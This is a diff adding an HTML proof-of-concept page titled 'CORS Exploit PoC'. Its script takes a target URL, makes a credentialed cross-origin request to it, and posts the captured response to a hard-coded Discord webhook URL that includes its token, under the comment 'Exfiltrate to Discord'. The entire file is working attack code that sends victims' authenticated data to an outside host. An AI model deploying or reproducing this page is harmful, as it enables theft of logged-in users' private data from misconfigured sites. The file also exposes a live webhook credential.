@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Exploit PoC</title>
+</head>
+<body>
+  <h2>CORS Exploit PoC</h2>
+  <input type="text" id="targetURL" placeholder="Enter vulnerable URL" />
+  <button onclick="exploitCORS()">Exploit</button>
+
+  <script>
+  function exploitCORS() {
+      var targetUrl = document.getElementById("targetURL").value;
+      if (!targetUrl) {
+          alert("Enter target URL");
+          return;
+      }
+
+      var req = new XMLHttpRequest();
+      req.onload = function() {
+          var data = this.responseText;
+
+          // Exfiltrate to Discord
+          var xhr = new XMLHttpRequest();
+          xhr.open("POST", "https://discord.com/api/webhooks/1407353175672881214/JHPRrs0V8ImR2hEPf7grUVXUdvgdr8Haqa3o_VQrUjm4AOuYjHkFIuommfXRdNirwnlb", true);
+          xhr.setRequestHeader("Content-Type", "application/json");
+          xhr.send(JSON.stringify({
+              "content": "CORS exploit captured data:\n```" + data.substring(0,1900) + "```"
+          }));
+      };
+      req.open("GET", targetUrl, true);
+      req.withCredentials = true;
+      req.send();
+  }
+  </script>
+</body>
+</html>
